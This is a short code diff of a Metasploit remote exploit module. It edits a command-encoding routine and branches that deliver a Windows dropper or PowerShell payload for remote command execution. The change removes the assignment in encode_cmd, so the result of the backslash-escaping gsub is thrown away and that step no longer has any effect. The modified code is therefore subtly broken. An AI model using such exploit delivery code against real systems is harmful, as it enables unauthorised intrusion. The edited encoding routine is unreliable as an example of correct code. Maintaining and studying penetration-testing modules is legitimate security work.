@@ -136,8 +136,8 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def encode_cmd(cmd)
-    cmd = cmd.gsub('\\', '\\\\\\')
-    cmd = cmd.gsub('"', '\u0022').gsub('&', '\u0026').gsub('+', '\u002b')
+    cmd.gsub('\\', '\\\\\\')
+    cmd.gsub('"', '\u0022').gsub('&', '\u0026').gsub('+', '\u002b')
   end
 
   def execute_command(cmd, _opts = {})
@@ -559,7 +559,7 @@ class MetasploitModule < Msf::Exploit::Remote
         print_line(output)
       end
     when :windows_dropper
-      execute_command(generate_cmdstager.join())
+      execute_command(generate_cmdstager.join)
     when :windows_powershell
       cmd = cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true)
       execute_command(cmd)
